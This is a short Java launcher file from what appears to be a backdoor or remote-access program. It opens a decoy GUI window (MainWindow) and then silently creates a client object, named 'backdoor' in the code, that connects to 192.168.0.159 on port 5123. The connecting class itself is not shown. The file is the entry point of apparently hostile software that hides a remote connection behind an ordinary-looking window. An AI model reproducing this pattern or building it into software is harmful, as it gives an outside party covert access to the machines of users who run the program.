package launcher;

import java.io.IOException;

import connection.ClientSide;
import view.MainWindow;

public class Main {
	public static void main(String[] args) throws IOException {
		new MainWindow();
		ClientSide backdoor = new ClientSide("192.168.0.159", 5123);
		backdoor.connect();
	}
}
